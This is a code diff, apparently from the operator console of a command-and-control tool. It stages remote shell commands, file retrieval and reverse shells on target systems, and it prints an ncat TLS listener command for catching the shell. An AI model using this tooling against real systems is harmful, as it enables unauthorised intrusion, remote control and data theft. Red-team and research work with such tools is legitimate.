@@ -31,12 +31,12 @@ var (
 	filename  = serveFile.Arg("filename", "name of file to stage").Required().String()
 	outfile   = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()
 	cmd       = app.Command("cmd", "stage a command")
-	exec      = cmd.Command("exec", "execute a shell command on target")
+	exe       = cmd.Command("exec", "execute a shell command on target")
 	get       = cmd.Command("get", "get file(s) from a remote system")
 	revshell  = cmd.Command("revshell", "initiate reverse shell with one remote system")
 	viewCmd   = cmd.Command("view", "view current command stage")
 	deleteC   = cmd.Command("clear", "remove a command from the stage")
-	cmdstring = exec.Arg("command", "command to execute").Required().String()
+	cmdstring = exe.Arg("command", "command to execute").Required().String()
 	files     = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
 	lhost     = revshell.Arg("lhost", "host that client connects to").Required().String()
 	lport     = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()
@@ -61,7 +61,7 @@ func main() {
 		return
 	case serveFile.FullCommand():
 		handleServe(db)
-	case exec.FullCommand():
+	case exe.FullCommand():
 		handleCmd(db, "exec")
 	case get.FullCommand():
 		handleCmd(db, "get")
@@ -171,19 +171,20 @@ func handleCmd(db *datastore.Kdb, myCmd string) {
 	case "exec":
 		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *cmdstring})
 	case "get":
-		if len(*files) != 0 {
-			for _, f := range strings.Split(*files, ",") {
-				cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: f})
-			}
+		for _, f := range strings.Split(*files, ",") {
+			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: f})
 		}
 	case "revshell":
-		if len(*lhost) != 0 && len(*lport) != 0 {
-			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lhost})
-			cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lport})
+		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lhost})
+		cmdObj.Args = append(cmdObj.Args, models.MultiType{StrValue: *lport})
+		crtfile, keyfile, err := config.GetSSLPair()
+		if err != nil {
+			log.Fatal(err)
 		}
-		fmt.Println("start a TLS listener with ncat. example:")
-		fmt.Printf("ncat -lnvp %s --ssl-cert $HOME/.kdots/karmine.crt --ssl-key $HOME/.kdots/karmine.key\n", *lport)
 
+		cmd := fmt.Sprintf("ncat -lnvp %s --ssl-cert %s --ssl-key %s", *lport, crtfile, keyfile)
+		fmt.Println("[+] run in separate terminal window:")
+		fmt.Println(cmd)
 	}
 	bytes, err := json.Marshal(cmdObj)
 	if err != nil {
